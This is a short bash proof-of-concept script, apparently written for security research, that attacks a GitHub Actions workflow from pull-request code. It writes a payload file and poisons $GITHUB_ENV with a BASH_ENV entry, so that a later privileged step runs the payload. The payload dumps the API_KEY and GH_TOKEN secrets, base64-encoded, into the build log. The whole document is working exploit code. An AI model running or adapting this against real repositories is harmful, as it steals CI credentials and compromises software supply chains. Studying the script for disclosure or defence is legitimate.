#!/usr/bin/env bash
# Attacker-controlled code from the PR head. In the real target this role is played by
# `lake build`/lakefile.lean (Lean elaborates the lakefile and any #eval in the tree).
# It writes an env var into $GITHUB_ENV so a LATER step executes our code with its secrets.
set -u
env_file="${GITHUB_ENV:-}"
echo "PR_BUILD_RAN sha=$(git rev-parse HEAD)"
cat > /tmp/gab-evil.sh <<'EVIL'
if [ -n "${API_KEY:-}" ] && [ ! -f /tmp/gab-leak-done ]; then
  printf 'BASH_ENV_EXEC api_len=%s token_len=%s leak=%s\n' \
    "${#API_KEY}" "${#GH_TOKEN_STEP}" \
    "$(printf '%s|%s' "$API_KEY" "${GH_TOKEN_STEP:-}" | base64 -w0)"
  touch /tmp/gab-leak-done
fi
EVIL
if [ -n "$env_file" ]; then
  echo "BASH_ENV=/tmp/gab-evil.sh" >> "$env_file"
  echo "GITHUB_ENV_POISONED"
fi
